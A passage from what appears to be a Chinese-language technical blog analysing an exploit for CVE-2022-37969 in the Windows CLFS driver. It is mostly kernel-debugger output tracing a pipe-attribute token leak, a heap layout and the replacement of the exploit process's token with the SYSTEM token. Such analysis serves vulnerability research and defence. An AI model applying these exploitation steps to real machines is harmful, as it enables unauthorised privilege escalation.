</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c060  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>24f</span><span style=color:#ae81ff>9</span>c070  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>之后通过_NtFsControlFile并设ControlCode为0x110038，则会读取pipe对象的AttributeValue并写入到用户提供的缓冲区中，读取到这里已经读取到了system token的地址。</p><p>为了完成token替换，exp第二次触发漏洞，在触发之前堆内存进行布局。把system token地址布局到0xFFFFFFFF，从0x10008开始每隔0x10把自身token地址写入到该地址中</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/17.png></p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/18.png></p><p>触发漏洞（这里重新调试了，所以地址不一样），在CLFS!CClfsBaseFilePersisted::RemoveContainer中断下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> g
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> hit
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>RemoveContainer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x48</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>fffff807<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>13</span>a66df8 <span style=color:#ae81ff>488</span>bf8          mov     rdi,rax
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd070  <span style=color:#ae81ff>06</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>c6 <span style=color:#ae81ff>6</span>c <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>93</span> <span style=color:#ae81ff>9</span>c <span style=color:#ae81ff>15</span> ee <span style=color:#ae81ff>11</span>  .........l......
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd080  bc <span style=color:#ae81ff>82</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>0</span>c <span style=color:#ae81ff>29</span> <span style=color:#ae81ff>07</span> fc <span style=color:#ae81ff>32</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ....).<span style=color:#ae81ff>.2</span>........
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd090  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd0a0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd0b0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd0c0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd0d0  <span style=color:#ae81ff>38</span> <span style=color:#ae81ff>13</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>8.</span>..............
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0dd0e0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>38</span> <span style=color:#ae81ff>14</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  .......<span style=color:#ae81ff>.8</span>.......
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1468</span>
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de4d8  <span style=color:#ae81ff>08</span> f0 fd c1 <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#ae81ff>.0</span>...........
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de4e8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>10</span> <span style=color:#ae81ff>38</span> bb <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ........<span style=color:#ae81ff>.8</span>......
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de4f8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de508  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de518  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de528  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de538  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0</span>c0de548  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span></code></pre></div><p>查看此时的pContainer对象</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db bb3810
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3810  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3820  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3830  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3840  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3850  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3860  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3870  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00</span>bb3880  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>30</span> <span style=color:#ae81ff>75</span> fe <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>83</span> b1 ff ff  .......<span style=color:#ae81ff>.0</span>u......
</span></span></code></pre></div><p>vtable</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq <span style=color:#ae81ff>5000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000000</span>  <span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23456789</span> fffff807<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>15ff</span><span style=color:#ae81ff>2</span>da0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000010</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> fffff807<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>13</span>a51cb0
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000020</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000030</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000040</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000050</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000060</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>05000070</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span></code></pre></div><p>执行到nt!SeSetAccessStateGenericMapping函数时，rdx指向内存0xFFFFFFFF，该内存存储了system token的地址，将其写入到rax+8指向的地址中，此处为自身token地址，也就是将system token地址写入到了自身token地址中，即把自身token 替换成了system token达成提权。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>system权限token
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dp rdx L6
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span>ffffffff  ffff8e86<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>03e616</span>fc <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000000f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000001f</span>  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>!</span>process <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Searching <span style=color:#66d9ef>for</span> Process with Cid <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>PROCESS ffffb1838ce87180
</span></span><span style=display:flex><span>    SessionId: none  Cid: <span style=color:#ae81ff>0004</span>    Peb: <span style=color:#ae81ff>00000000</span>  ParentCid: <span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>    DirBase: <span style=color:#ae81ff>001</span>ad000  ObjectTable: ffff8e8603e57d40  HandleCount: <span style=color:#ae81ff>2731.</span>
</span></span><span style=display:flex><span>    Image: System
</span></span><span style=display:flex><span>    VadRoot ffffb1838ce94920 Vads <span style=color:#ae81ff>6</span> Clone <span style=color:#ae81ff>0</span> Private <span style=color:#ae81ff>22.</span> Modified <span style=color:#ae81ff>4650.</span> Locked <span style=color:#ae81ff>0.</span>
</span></span><span style=display:flex><span>    DeviceMap ffff8e8603e35ae0
</span></span><span style=display:flex><span>    Token                             ffff8e8603e616f0
</span></span><span style=display:flex><span>    ElapsedTime                       <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span><span style=color:#f92672>:</span><span style=color:#ae81ff>07.536</span>
</span></span><span style=display:flex><span>    UserTime                          <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00.000</span>
</span></span><span style=display:flex><span>    KernelTime                        <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>03.093</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[PagedPool]         <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    QuotaPoolUsage[NonPagedPool]      <span style=color:#ae81ff>272</span>
</span></span><span style=display:flex><span>    Working Set <span style=color:#a6e22e>Sizes</span> (now,min,max)  (<span style=color:#ae81ff>49</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>450</span>) (<span style=color:#ae81ff>196</span>KB, <span style=color:#ae81ff>200</span>KB, <span style=color:#ae81ff>1800</span>KB)
</span></span><span style=display:flex><span>    PeakWorkingSetSize                <span style=color:#ae81ff>216</span>
</span></span><span style=display:flex><span>    VirtualSize                       <span style=color:#ae81ff>3</span> Mb
</span></span><span style=display:flex><span>    PeakVirtualSize                   <span style=color:#ae81ff>14</span> Mb
</span></span><span style=display:flex><span>    PageFaultCount                    <span style=color:#ae81ff>2325</span>
</span></span><span style=display:flex><span>    MemoryPriority                    BACKGROUND
</span></span><span style=display:flex><span>    BasePriority                      <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>    CommitCharge                      <span style=color:#ae81ff>49</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>当前权限</span>token
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>!</span>process <span style=color:#ae81ff>0x10cc</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Searching <span style=color:#66d9ef>for</span> Process with Cid <span style=color:#f92672>==</span> <span style=color:#ae81ff>10</span>cc
</span></span><span style=display:flex><span>PROCESS ffffb18391fe7080
</span></span><span style=display:flex><span>    SessionId: <span style=color:#ae81ff>1</span>  Cid: <span style=color:#ae81ff>10</span>cc    Peb: f894963000  ParentCid: <span style=color:#ae81ff>02</span><span style=color:#ae81ff>94</span>
</span></span><span style=display:flex><span>    DirBase: a8104000  ObjectTable: ffff8e860b632980  HandleCount:  <span style=color:#ae81ff>92.</span>
</span></span><span style=display:flex><span>    Image: exp.exe
</span></span><span style=display:flex><span>    VadRoot ffffb18392993580 Vads <span style=color:#ae81ff>57</span> Clone <span style=color:#ae81ff>0</span> Private <span style=color:#ae81ff>4686.</span> Modified <span style=color:#ae81ff>1209.</span> Locked <span style=color:#ae81ff>0.</span>
</span></span><span style=display:flex><span>    DeviceMap ffff8e8608a9b1d0
</span></span><span style=display:flex><span>    Token                             ffff8e860bc6f770
